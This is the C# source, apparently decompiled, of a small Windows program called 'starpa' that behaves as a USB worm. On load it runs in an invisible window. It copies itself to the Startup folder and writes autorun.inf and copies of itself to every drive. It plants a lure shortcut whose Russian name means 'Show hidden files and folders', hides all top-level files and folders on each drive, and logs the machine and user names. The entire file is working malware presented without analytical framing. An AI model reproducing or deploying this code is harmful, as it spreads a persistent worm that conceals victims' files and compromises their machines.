using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace starpa;

public class Form1 : Form
{
	private string show_or_hide;

	private string[] autoruntext = new string[2] { "[autorun]", "open=starpa.exe" };

	private string startdisk = Application.get_ExecutablePath().Substring(0, 3);

	private string[] disks_arr = Environment.GetLogicalDrives();

	private IContainer components = null;

	private RichTextBox richTextBox1;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		WriteLogFile(string.Concat("\r\n", DateTime.Now, "--->", Environment.MachineName, "--->", Environment.UserName));
		try
		{
			File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\starpa.exe", overwrite: true);
		}
		catch (Exception ex)
		{
			WriteLogFile(ex.Message);
		}
		try
		{
			for (int i = 0; i < disks_arr.Length; i++)
			{
				File.WriteAllLines(disks_arr[i] + "autorun.inf", autoruntext);
				File.Copy(Application.get_ExecutablePath(), disks_arr[i] + "starpa.exe", overwrite: true);
				File.Copy(Application.get_StartupPath() + "Показать скрытые файлы и папки.lnk", disks_arr[i] + "//Показать скрытые файлы и папки.lnk");
			}
		}
		catch (Exception ex)
		{
			WriteLogFile(ex.Message);
		}
		try
		{
			show_or_hide = Environment.GetCommandLineArgs()[1];
		}
		catch
		{
		}
		for (int j = 0; j < disks_arr.Length; j++)
		{
			string[] directories = Directory.GetDirectories(disks_arr[j]);
			string[] files = Directory.GetFiles(disks_arr[j]);
			for (int k = 0; k < directories.Length; k++)
			{
				try
				{
					if (show_or_hide != "show")
					{
						File.SetAttributes(directories[k], FileAttributes.Hidden);
					}
					else
					{
						File.SetAttributes(directories[k], FileAttributes.Normal);
					}
				}
				catch (Exception ex)
				{
					WriteLogFile(ex.Message);
				}
			}
			for (int l = 0; l < files.Length; l++)
			{
				try
				{
					if (show_or_hide != "show")
					{
						File.SetAttributes(files[l], FileAttributes.Hidden);
					}
					else
					{
						File.SetAttributes(files[l], FileAttributes.Normal);
					}
				}
				catch (Exception ex)
				{
					WriteLogFile(ex.Message);
				}
			}
		}
		Application.Exit();
	}

	private void WriteLogFile(string writestring)
	{
		try
		{
			File.AppendAllText(startdisk + "starpa.log", writestring + "\r\n", Encoding.UTF8);
		}
		catch
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		richTextBox1 = new RichTextBox();
		((Control)this).SuspendLayout();
		((Control)richTextBox1).set_Dock((DockStyle)5);
		((Control)richTextBox1).set_Location(new Point(0, 0));
		((Control)richTextBox1).set_Name("richTextBox1");
		((Control)richTextBox1).set_Size(new Size(10, 10));
		((Control)richTextBox1).set_TabIndex(0);
		((Control)richTextBox1).set_Text("");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)richTextBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
